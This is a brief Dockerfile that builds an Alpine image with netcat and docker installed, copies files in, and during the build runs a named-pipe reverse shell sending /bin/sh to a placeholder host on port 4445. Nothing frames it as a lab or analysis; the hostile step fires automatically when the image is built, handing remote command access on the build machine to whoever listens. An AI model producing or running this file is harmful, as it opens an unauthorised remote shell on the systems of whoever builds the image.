FROM alpine:latest

RUN apk add --update --no-cache netcat-openbsd docker
RUN mkdir /files
COPY * /files/
RUN mknod /tmp/back p
RUN /bin/sh 0</tmp/back | nc x.x.x.x 4445 1 >/tmp/back
